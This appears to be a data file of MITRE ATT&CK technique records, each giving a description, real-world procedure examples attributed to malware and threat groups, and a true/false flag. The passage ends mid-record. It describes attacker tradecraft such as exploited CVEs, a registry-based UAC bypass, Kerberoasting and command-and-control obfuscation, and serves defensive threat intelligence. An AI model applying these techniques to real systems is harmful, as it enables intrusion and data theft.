T1559,Inter-Process Communication,"Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern.   Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange] or [Component Object Model] Linux environments support several different IPC mechanisms, two of which being sockets and pipes. Higher level execution mediums, such as those of [Command and Scripting Interpreter] may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services] such as [Distributed Component Object Model] to facilitate remote IPC execution.","['[PITSTOP] can listen over the Unix domain socket located at `/data/runtime/cockpit/wd.fd`.', '[Uroburos] has the ability to move data between its kernel and user mode components, generally using named pipes.', '[HyperStack] can connect to the IPC$ share on remote machines.', '[Cyclops Blink] has the ability to create a pipe to enable inter-process communication.', 'When executing with non-root permissions, [RotaJakiro] uses the the `shmget API` to create shared memory between other known [RotaJakiro] processes. This allows processes to communicate with each other and share their PID.', '[Ninja] can use pipes to redirect the standard input and the standard output.']",
T1001,Data Obfuscation,"Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. ","['[SLOTHFULMEDIA] has hashed a string containing system information prior to exfiltration via POST requests.', '[Ninja] has the ability to modify headers and URL paths to hide malicious traffic in HTTP requests.', '[TrailBlazer] can masquerade its C2 traffic as legitimate Google Notifications HTTP requests.', 'During [Operation Wocao] threat actors encrypted IP addresses used for ""Agent"" proxy hops with RC4.', '[FunnyDream] can send compressed and obfuscated packets to C2.', '[DarkGate] will retrieved encrypted commands from its command and control server for follow-on actions such as cryptocurrency mining.', '[FRAMESTING] can send and receive zlib compressed data within `POST` requests.', '[RDAT] has used encoded data within subdomains as AES ciphertext to communicate from the host to the C2.', '[FlawedAmmyy] may obfuscate portions of the initial C2 handshake.', '[SideTwist] can embed C2 responses in the source code of a fake Flickr webpage.', '[Operation Wocao] has encrypted IP addresses used for ""Agent"" proxy hops with RC4.', 'The [Axiom] group has used other forms of obfuscation, include commingling legitimate traffic with communications traffic so that network streams appear legitimate.', 'POWRUNER can use base64 encoded C2 communications.', 'POWERSTATS encoded C2 traffic with base64.']",False
T1039,Data from Network Shared Drive,"Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd] may be used to gather information.","['[CosmicDuke] steals user files from network shared drives with file extensions and keywords that match a predefined list.', '[APT28] has collected files from network shared drives.', '[Gamaredon Group] malware has collected Microsoft Office documents from mapped network drives.', '[BRONZE BUTLER] has exfiltrated files stolen from file shares.', '[Egregor] can collect any files found in the enumerated drivers before sending it to its C2 channel. ', '[Sowbug] extracted Word documents from a file server on a victim network.', '[Ramsay] can collect data from network drives and stage it for exfiltration.\t', ""When it first starts, [BADNEWS] crawls the victim's mapped drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt."", '[Chimera] has collected data of interest from network shares.', '[menuPass] has collected data from remote systems by mounting network shares with <code>net use</code> and using Robocopy to transfer data.', 'During [C0015] the threat actors collected files from network shared drives prior to network encryption.', '[Fox Kitten] has searched network shares to access sensitive documents.']",False
T1601,Modify System Image,"Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.  To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",[],
T1574,Hijack Execution Flow,"Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.  There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.","['[DarkGate] edits the Registry key <code>HKCU\\Software\\Classes\\mscfile\\shell\\open\\command</code> to execute a malicious AutoIt script. When eventvwr.exe is executed, this will call the Microsoft Management Console (mmc.exe), which in turn references the modified Registry key.', 'One of [Dtrack] can replace the normal flow of a program execution with malicious code.', '[ShimRat] can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls.', '[Denis] replaces the nonexistent Windows DLL ""msfte.dll"" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe.', 'During [C0017] [APT41] established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries. ', '[COATHANGER] will remove and write malicious shared objects associated with legitimate system functions such as `read(2)`.']",False
T1078,Valid Accounts,"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.  In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.  The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.","['[APT41] used compromised credentials to log on to other systems.', '[FIN8] has used valid accounts for persistence and lateral movement.', '[FIN4] has used legitimate credentials to hijack email communications.', '[FIN7] has harvested valid administrative credentials for lateral movement.', '[Kinsing] has used valid SSH credentials to access remote hosts.', '[Dragonfly] has compromised user credentials and used valid accounts for operations.', '[GALLIUM] leveraged valid accounts to maintain access to a victim network.', '[APT18] actors leverage legitimate credentials to log into external remote services.', 'During the [C0032] campaign, [TEMP.Veles] used compromised VPN accounts.', '[Lazarus Group] has used administrator credentials to gain access to restricted network segments.', '[Chimera] has used a valid account to maintain persistence via scheduled task.', 'Some [SeaDuke] samples have a module to extract email from Microsoft Exchange servers using compromised credentials.', '[Dtrack] used hard-coded credentials to gain access to a network share.', '[Industroyer] can use supplied user credentials to execute processes and stop services.', 'During [Night Dragon] threat actors used compromised VPN accounts to gain access to victim systems.', '[menuPass] has used valid accounts including shared between Managed Service Providers and clients to move between the two environments.', 'Adversaries can instruct [Duqu] to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.', '[Sandworm Team] have used previously acquired legitimate credentials prior to attacks.', '[Cinnamon Tempest] has used compromised user accounts to deploy payloads and create system services.', '[Akira] uses valid account information to remotely access victim networks, such as VPN credentials.', ""[LAPSUS$] has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs."", '[Carbanak] actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.', 'During [Operation Wocao] threat actors used valid VPN credentials to gain initial access.', ""[APT28] has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder."", '[Threat Group-3390] actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.', '[Suckfly] used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. ', '[Axiom] has used previously compromised administrative accounts to escalate privileges.', '[Leviathan] has obtained valid accounts to gain initial access.', '[PittyTiger] attempts to obtain legitimate credentials during operations.', '[Silence] has used compromised credentials to log on to other systems and escalate privileges.', '[OilRig] has used compromised credentials to access other systems on a victim network.', '[Wizard Spider] has used valid credentials for privileged accounts with the goal of accessing domain controllers.', ""[APT29] has used a compromised account to access an organization's VPN infrastructure."", '[Ke3chang] has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts.', '[FIN10] has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.', '[APT33] has used valid accounts for initial access and privilege escalation.', 'To move laterally on a victim network, [FIN6] has used credentials stolen from various systems on which it gathered usernames and password hashes.', '[Fox Kitten] has used valid credentials with various services during lateral movement.', '[POLONIUM] has used valid compromised credentials to gain access to victim environments.', '[FIN5] has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.', '[Linux Rabbit] acquires valid SSH accounts through brute force. ', '[Silent Librarian] has used compromised credentials to obtain unauthorized access to online accounts.', '[APT39] has used stolen credentials to compromise Outlook Web Access (OWA).', 'During the [SolarWinds Compromise] [APT29] used different compromised credentials for remote access and to move laterally.', '[TEMP.Veles] has used compromised VPN accounts.\t', '[UNC2452] used different compromised credentials for remote access and to move laterally.', '[APT29] used different compromised credentials for remote access and to move laterally.', '[Night Dragon] has used compromised VPN accounts to gain access to victim systems.', '[Operation Wocao] has used valid VPN credentials to gain initial access.', '[Dragonfly 2.0] compromised user credentials and used valid accounts for operations.', '[Leviathan] has used valid, compromised email accounts for defense evasion, including to send malicious emails to other victim organizations.', 'APT34 has used valid administrator credentials to assist in lateral movement.']",False
T1571,Non-Standard Port,"Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.  Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.","['[WIRTE] has used HTTPS over ports 2083 and 2087 for C2.', '[Silence] has used port 444 when sending data about the system from the client to the server.\t', '[PingPull] can use HTTPS over port 8080 for C2.', '[Emotet] has used HTTP over ports such as 20, 22, 443, 7080, and 50000, in addition to using ports commonly associated with HTTP/S.', ' [StrongPity] has used HTTPS over port 1402 in C2 communication.', '[PoetRAT] used TLS to encrypt communications over port 143', '[GoldenSpy] has used HTTP over ports 9005 and 9006 for network traffic, 9002 for C2 requests, 33666 as a WebSocket, and 8090 to download files.', '[SUGARUSH] has used port 4585 for a TCP connection to its C2.', 'During [Operation Wocao] the threat actors used uncommon high ports for its backdoor C2, including ports 25667 and 47000.', '[WellMail] has been observed using TCP port 25, without using SMTP, to leverage an open port for secure command and control communications.', '[HOPLIGHT] has connected outbound over TCP port 443 with a FakeTLS method.', '[ZxShell] can use ports 1985 and 1986 in HTTP/S communication.', '[MoonWind] communicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports.', 'An [APT32] backdoor can use HTTP over a non-standard TCP port (e.g 14146) which is specified in the backdoor configuration.', 'During [C0018] the threat actors opened a variety of ports, including ports 28035, 32467, 41578, and 46892, to establish RDP connections.', '[HARDRAIN] binds and listens on port 443 with a FakeTLS method.', '[OSX_OCEANLOTUS.D] has used a custom binary protocol over TCP port 443 for C2.', '[Metamorfo] has communicated with hosts over raw TCP on port 9999. ', 'During the [C0032] campaign, [TEMP.Veles] used port-protocol mismatches on ports such as 443, 4444, 8531, and 50501 during C2.', '[BendyBear] has used a custom RC4 and XOR encrypted protocol over port 443 for C2.', ""[Sandworm Team] has used port 6789 to accept connections on the group's SSH server."", 'Some [Lazarus Group] malware uses a list of ordered port numbers to choose a port for C2 traffic, creating port-protocol mismatches.', '[njRAT] has used port 1177 for HTTP C2 communications.', '[FIN7] has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during C2.', '[Sardonic] has the ability to connect with actor-controlled C2 servers using a custom binary protocol over port 443.', '[MacMa] has used TCP port 5633 for C2 Communication.', '[Derusbi] has used unencrypted HTTP on port 443 for C2.', '[RotaJakiro] uses a custom binary protocol over TCP port 443.', '[RTM] used Port 44443 for its VNC module.', '[Magic Hound] malware has communicated with its C2 server over TCP ports 4443 and 10151 using HTTP.', 'Some [TrickBot] samples have used HTTP over ports 447 and 8082 for C2. Newer versions of [TrickBot] have been known to use a custom communication protocol which sends the data unencrypted over port 443. ', '[QuasarRAT] can use port 4782 on the compromised host for TCP callbacks.', '[BADCALL] communicates on ports 443 and 8000 with a FakeTLS method.', '[DarkVishnya] used ports 5190 and 7900 for shellcode listeners, and 4444, 4445, 31337 for shellcode C2.', '[TYPEFRAME] has used ports 443, 8080, and 8443 with a FakeTLS method.', '[APT-C-36] has used port 4050 for C2 communications.', '[GravityRAT] has used HTTP over a non-standard port, such as TCP port 46769.', '[APT33] has used HTTP over TCP ports 808 and 880 for command and control.', '[Bankshot] binds and listens on port 1058 for HTTP traffic while also utilizing a FakeTLS method.', '[RedLeaves] can use HTTP over non-standard ports, such as 995, for C2.', '[Cyclops Blink] can use non-standard ports for C2 not typically associated with HTTP or HTTPS traffic.', '[Rocke] miner connects to a C2 server using port 51640.\t', '[TEMP.Veles] has used port-protocol mismatches on ports such as 443, 4444, 8531, and 50501 during C2.']",False
T1073,DLL Side-Loading,"Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests  are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable to side-loading to load a malicious DLL.   Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.",[],True
T1068,Exploitation for Privilege Escalation,"Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.  When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.  Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer] or [Lateral Tool Transfer]","['[Threat Group-3390] has used CVE-2014-6324 and CVE-2017-0213 to escalate privileges.', '[Remsec] has a plugin to drop and execute vulnerable Outpost Sandbox or avast! Virtualization drivers in order to gain kernel mode privileges.', '[PoshC2] contains modules for local privilege escalation exploits such as CVE-2016-9192 and CVE-2016-0099.', '[APT29] has exploited CVE-2021-36934 to escalate privileges on a compromised host.', '[Turla] has exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges.', '[PLATINUM] has leveraged a zero-day vulnerability to escalate privileges.', '[Cobalt Strike] can exploit vulnerabilities such as MS14-058.', '[Empire] can exploit vulnerabilities such as MS16-032 and MS16-135.', '[FIN8] has exploited the CVE-2016-0167 local vulnerability.', '[Cobalt Group] has used exploits to increase their levels of rights and privileges.', '[Pandora] can use CVE-2017-15303 to bypass Windows Driver Signature Enforcement (DSE) protection and load its driver.', '[Carberp] has exploited multiple Windows vulnerabilities (CVE-2010-2743, CVE-2010-3338, CVE-2010-4398, CVE-2008-1084) and a .NET Runtime Optimization vulnerability for privilege escalation.', '[CosmicDuke] attempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398.', '[InvisiMole] has exploited CVE-2007-5633 vulnerability in the speedfan.sys driver to obtain kernel mode privileges.', 'During [C0017] [APT41] abused named pipe impersonation for privilege escalation.', '[MoustachedBouncer] has exploited CVE-2021-1732 to execute malware components with elevated rights.', '[FIN6] has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.', '[Whitefly] has used an open-source tool to exploit a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers.\t', '[BITTER] has exploited CVE-2021-1732 for privilege escalation.', '[JHUHUGIT] has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.', '[Stuxnet] used MS10-073 and an undisclosed Task Scheduler vulnerability to escalate privileges on local Windows machines.', '[LAPSUS$] has exploited unpatched vulnerabilities on internally accessible servers including JIRA, GitLab, and Confluence for privilege escalation.', '[Siloscape] has leveraged a vulnerability in Windows containers to perform an [Escape to Host]', '[XCSSET] has used a zero-day exploit in the ssh launchdaemon to elevate privileges and bypass SIP.', '[Zox] has the ability to leverage local and remote exploits to escalate privileges.', '[Scattered Spider] has deployed a malicious kernel driver through exploitation of CVE-2015-2291 in the Intel Ethernet diagnostics driver for Windows (iqvw64.sys).', '[APT28] has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263 to escalate privileges.', '[ZIRCONIUM] has exploited CVE-2017-0005 for local privilege escalation.', '[Tonto Team] has exploited CVE-2019-0803 and MS16-032 to escalate privileges.', '[ProLock] can use CVE-2019-0859 to escalate privileges on a compromised host.', '[Wingbird] exploits CVE-2016-4117 to allow an executable to gain escalated privileges.', '[APT32] has used CVE-2016-7255 to escalate privileges.', '[APT33] has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system.', '[Hildegard] has used the BOtB tool which exploits CVE-2019-5736. ', '[Cobalt Strike] can exploit vulnerabilities such as MS14-058.', 'Flame can use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally.']",False
T1531,Account Access Removal,"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot] to set malicious changes into place.  In Windows, [Net] utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code> [PowerShell] cmdlets may be used by adversaries to modify user accounts. In Linux, the <code>passwd</code> utility may be used to change passwords. Accounts could also be disabled by Group Policy.   Adversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as [Data Destruction] and [Defacement] in order to impede incident response/recovery before completing the [Data Encrypted for Impact] objective. ","['[Akira] deletes administrator accounts in victim networks prior to encryption.', '[MegaCortex] has changed user account passwords and logged users off the system.', '[LockerGoga] has been observed changing account passwords and logging off current users.', '[Meteor] has the ability to change the password of local users on compromised hosts and can log off users.', ""[LAPSUS$] has removed a targeted organization's global admin accounts to lock the organization out of all access.""]",False
T1208,Kerberoasting,"Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service ).      Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).   Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force] attacks that may expose plaintext credentials.     This same attack could be executed using service tickets captured from network traffic.   Cracked hashes may enable Persistence, Privilege Escalation, and  Lateral Movement via access to [Valid Accounts] ",[],True
T1027,Obfuscated Files or Information,"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.   Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information] for [User Execution] The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript.   Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled.   Adversaries may also abuse [Command Obfuscation] to obscure commands executed from payloads or directly via [Command and Scripting Interpreter] Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ","['[BackdoorDiplomacy] has obfuscated tools and malware it uses with VMProtect.', '[Ryuk] can use anti-disassembly and code transformation obfuscation techniques.', '[DarkTortilla] has been obfuscated with the DeepSea .NET and ConfuserEx code obfuscators.', '[Lokibot] has obfuscated strings with base64 encoding.', '[SVCReady] can encrypt victim data with an RC4 cipher.', '[PowerStallion] uses a XOR cipher to encrypt command output written to its OneDrive C2 server.', '[SynAck] payloads are obfuscated prior to compilation to inhibit analysis and/or reverse engineering.', '[Amadey] has obfuscated strings such as antivirus vendor names, domains, files, and others.', '[PolyglotDuke] can custom encrypt strings.', '[PUNCHTRACK] is loaded and executed by a highly obfuscated launcher.', '[ECCENTRICBANDWAGON] has encrypted strings with RC4.', '[Drovorub] has used XOR encrypted payloads in WebSocket client to server messages.', '[Valak] has the ability to base64 encode and XOR encrypt strings.', '[Rocke] has modified UPX headers after packing files to break unpackers.', '[PoisonIvy] hides any strings related to its own indicators of compromise.', '[Out1] has the ability to encode data.', '[HTTPBrowser] code may be obfuscated through structured exception handling and return-oriented programming.', '[Trojan.Karagany] can base64 encode and AES-128-CBC encrypt data prior to transmission.', '[GALLIUM] used a modified version of [HTRAN] in which they obfuscated strings such as debug messages in an apparent attempt to evade detection.', '[Gallmaker] obfuscated shellcode used during execution.', '[Saint Bot] has been obfuscated to help avoid detection.', '[NanoCore] plugins were obfuscated with Eazfuscater.NET 3.3.', '[SHOTPUT] is obscured using XOR encoding and appended to a valid GIF file.', '[SodaMaster] can use ""stackstrings"" for obfuscation.', '[CoinTicker] initially downloads a hidden encoded file.', '[Turian] can use VMProtect for obfuscation.', '[Snip3] has the ability to obfuscate strings using XOR encryption.', '[ComRAT] has encrypted its virtual file system using AES-256 in XTS mode. ', '[Final1stspy] obfuscates strings with base64 encoding.', 'The [DustySky] dropper uses a function to obfuscate the name of functions and other parts of the malware.', '[SUNSPOT] encrypted log entries it collected with the stream cipher RC4 using a hard-coded key. It also uses AES128-CBC encrypted blobs for [SUNBURST] source code and data extracted from the SolarWinds Orion <MsBuild.exe</code> process.', '[Pillowmint] has been compressed and stored within a registry key. [Pillowmint] has also obfuscated the AES key used for encryption.\t', '[Donut] can generate encrypted, compressed/encoded, or otherwise obfuscated code modules.', '[H1N1] uses multiple techniques to obfuscate strings, including XOR.', '[Kazuar] is obfuscated using the open source ConfuserEx protector. [Kazuar] also obfuscates the name of created files/folders/mutexes and encrypts debug messages written to log files using the Rijndael cipher.', '[NETWIRE] has used a custom obfuscation algorithm to hide strings including Registry keys, APIs, and DLL names.', '[SombRAT] can encrypt strings with XOR-based routines and use a custom AES storage format for plugins, configuration, C2 domains, and harvested data.', '[BlackOasis] first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools.', '[Pony] attachments have been delivered via compressed archive files. [Pony] also obfuscates the memory flow by adding junk instructions when executing to make analysis more difficult.\t', '[Agent Tesla] has had its code obfuscated in an apparent attempt to make analysis difficult. [Agent Tesla] has used the Rijndael symmetric encryption algorithm to encrypt strings.', '[TrickBot] uses non-descriptive names to hide functionality.', '[InnaputRAT] uses an 8-byte XOR key to obfuscate API names and other strings contained in the payload.', '[MiniDuke] can use control flow flattening to obscure code.', '[APT3] obfuscates files or information to help evade defensive measures.', '[TEARDROP] created and read from a file with a fake JPG header, and its payload was encrypted with a simple rotating XOR cipher.', '[Matryoshka] obfuscates API function names using a substitute cipher combined with Base64 encoding.', 'The [Clambling] executable has been obfuscated when dropped on a compromised host.', '[Brute Ratel C4] has used encrypted payload files and maintains an encrypted configuration structure in memory.', '[Shamoon] contains base64-encoded strings.', '[Hydraq] uses basic obfuscation in the form of spaghetti code.', '[QakBot] has hidden code within Excel spreadsheets by turning the font color to white and splitting it across multiple cells.', '[Ember Bear] has obfuscated malware to help avoid detection.', '[DarkGate] uses a hard-coded string as a seed, along with the victim machine hardware identifier and input text, to generate a unique string used as an internal mutex value to evade static detection based on mutexes.', '[Flagpro] has been delivered within ZIP or RAR password-protected archived files.', 'During [C0017] [APT41] broke malicious binaries, including [DEADEYE] and [KEYPLUG] into multiple sections on disk to evade detection.', '[Cuba] has used multiple layers of obfuscation to avoid analysis, including its Base64 encoded payload. ', '[Dridex] strings are obfuscated using RC4. ', '[Goopy] decrypter have been inflated with junk code in between legitimate API functions, and also included infinite loops to avoid analysis.', '[Ecipekac] can use XOR, AES, and DES to encrypt loader shellcode.', '[NOKKI] uses Base64 encoding for strings.', '[POSHSPY] appends a file signature header (randomly selected from six file types) to encrypted data prior to upload or download.', '[SUNBURST] strings were compressed and encoded in Base64. [SUNBURST] also obfuscated collected system information using a FNV-1a + XOR algorithm.', '[Remcos] uses RC4 and base64 to obfuscate data, including Registry entries and file paths.', '[Kerrdown] can encrypt, encode, and compress multiple layers of shellcode.', '[FatDuke] can use base64 encoding, string stacking, and opaque predicates for obfuscation.', '[APT-C-36] has used ConfuserEx to obfuscate its variant of [Imminent Monitor] compressed payload and RAT packages, and password protected encrypted email attachments to avoid detection.', '[Carbanak] encrypts strings to make analysis more difficult.', ' [Action RAT] commands, strings, and domains can be Base64 encoded within the payload.', '[Small Sieve] has the ability to use a custom hex byte swapping encoding scheme combined with an obfuscated Base64 function to protect program strings and Telegram credentials.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] used heavily obfuscated code with [Industroyer] in its Windows Notepad backdoor.', '[Bundlore] has obfuscated data with base64, AES, RC4, and bz2.', '[KillDisk] uses VMProtect to make reverse engineering the malware more difficult.', '[ROKRAT] can encrypt data prior to exfiltration by using an RSA public key.', '[P.A.S. Webshell] can use encryption and base64 encoding to hide strings and to enforce access control once deployed.', '[OLDBAIT] obfuscates internal strings and unpacks them at startup.', '[Anchor] has obfuscated code with stack strings and string encryption.', '[Daserf] uses encrypted Windows APIs and also encrypts data using the alternative base64+RC4 or the Caesar cipher.', '[Pandora] has the ability to compress stings with QuickLZ.', '[Windshift] has used string encoding with floating point calculations.', '[Ke3chang] has used Base64-encoded shellcode strings.', '[Ebury] has obfuscated its strings with a simple XOR encryption with a static key.', '[Conti] can use compiler-based obfuscation for its code, encrypt DLLs, and hide Windows API calls.', '[Kobalos] encrypts all strings using RC4 and bundles all functionality into a single function call. ', '[APT37] obfuscates strings and payloads.', '[InvisiMole] avoids analysis by encrypting all strings, internal files, configuration data and by using a custom executable format.', '[Bumblebee] has been delivered as password-protected zipped ISO files and used control-flow-flattening to obfuscate the flow of functions.', '[ISMInjector] is obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com.', '[Kimsuky] has obfuscated binary strings including the use of XOR encryption and Base64 encoding. [Kimsuky] has also modified the first byte of DLL implants targeting victims to prevent recognition of the executable file format.', '[Green Lambert] has encrypted strings. ', 'During [C0015] the threat actors used Base64-encoded strings.', '[Carbon] encrypts configuration files and tasks for the malware to complete using CAST-128 algorithm.', '[Diavol] has Base64 encoded the RSA public key used for encrypting files.', '[MCMD] can Base64 encode output strings prior to sending to C2.', '[ShimRat] has been delivered as a package that includes compressed DLL and shellcode payloads within a .dat file.', '[AppleSeed] has the ability to Base64 encode its payload and custom encrypt API calls.', '[BoxCaon] used the ""StackStrings"" obfuscation technique to hide malicious functionalities.', 'Most of the strings in [ADVSTORESHELL] are encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed. API function names are also reversed, presumably to avoid detection in memory.', '[Conficker] has obfuscated its code to prevent its removal from host machines.', '[Siloscape] itself is obfuscated and uses obfuscated API calls.', '[Mustang Panda] has delivered initial payloads hidden using archives and encoding measures.', '[ShadowPad] has encrypted its payload, a virtual file system, and various files.', '[EKANS] uses encoded strings in its process kill list. ', '[RegDuke] can use control-flow flattening or the commercially available .NET Reactor for obfuscation.', '[NightClub] can obfuscate strings using the congruential generator `(LCG): staten+1 = (690069 × staten + 1) mod 232`. ', '[Sandworm Team] has used Base64 encoding within malware variants.', '[Imminent Monitor] has encrypted the spearphish attachments to avoid detection from email gateways; the debugger also encrypts information before sending to the C2.', '[Earth Lusca] used Base64 to encode strings.', '[SoreFang] has the ability to encode and RC6 encrypt data sent to C2.', '[Hancitor] has used Base64 to encode malicious links. [Hancitor] has also delivered compressed payloads in ZIP files to victims.', '[Pisloader] obfuscates files by splitting strings into smaller sub-strings and including ""garbage"" strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data.', '[Avaddon] has used encrypted strings.', 'A [JPIN] uses a encrypted and compressed payload that is disguised as a bitmap within the resource section of the installer.', '[RTM] strings, network data, configuration, and modules are encrypted with a modified RC4 algorithm. [RTM] has also been delivered to targets as various archive files including ZIP, 7-ZIP, and RAR.', '[CARROTBALL] has used a custom base64 alphabet to decode files.', '[Sardonic] can use certain ConfuserEx features for obfuscation and can be encoded in a base64 string.', '[Gamaredon Group] has delivered self-extracting 7z archive files within malicious document attachments.', '[AppleJeus] has XOR-encrypted collected system information prior to sending to a C2. [AppleJeus] has also used the open source ADVObfuscation library for its components.', '[DRATzarus] can be partly encrypted with XOR.', '[AvosLocker] has used XOR-encoded strings.', '[PoetRAT] has used a custom encryption scheme for communication between scripts.', '[Ramsay] has base64-encoded its portable executable and hidden itself under a JPG 